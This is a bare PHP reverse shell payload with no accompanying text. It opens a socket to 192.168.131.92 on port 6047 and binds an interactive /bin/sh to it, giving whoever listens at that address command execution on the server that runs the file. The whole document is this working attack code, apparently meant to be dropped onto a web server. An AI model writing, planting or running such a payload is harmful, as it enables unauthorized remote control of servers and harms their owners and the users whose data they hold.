<?php
$sock = fsockopen("192.168.131.92", 6047);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
